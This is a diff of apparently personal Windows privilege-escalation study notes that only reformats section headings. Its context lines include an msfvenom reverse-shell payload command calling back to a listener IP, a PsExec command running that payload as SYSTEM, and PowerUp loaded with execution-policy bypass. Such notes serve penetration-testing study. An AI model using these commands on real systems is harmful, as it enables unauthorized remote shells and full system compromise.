@@ -47,7 +47,7 @@ First and foremost, [g0tmi1k's blog](https://blog.g0tmi1k.com/2011/08/basic-linu
 [FuzzySecurity's blog post](https://www.fuzzysecurity.com/tutorials/16.html)
 
 [Tib3rius's Windows PrivEsc course](https://www.udemy.com/course/windows-privilege-escalation/)
-  1. The Basics
+    - **The Basics**
 
 **Your User**
 > whoami
@@ -61,7 +61,7 @@ First and foremost, [g0tmi1k's blog](https://blog.g0tmi1k.com/2011/08/basic-linu
 > tasklist /SVC
 
 
-  2. Payloads
+    - **Payloads**
 msfvenom executable payload
 
 > msfvenom -p windows/shell\_reverse\_tcp LHOST=10.10.10.2 LPORT=4444 -f exe -o reverse.exe
@@ -74,7 +74,7 @@ PsExec from Windows Sysinternals
 
 > .\PsExec64.exe -accepteula -i -s C:\temp\reverse.exe
 
-  3. PrivEsc Enumeration Tools
+    - **PrivEsc Enumeration Tools**
 [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1):
 > powershell -exec bypass
 > . .\PowerUp.ps1
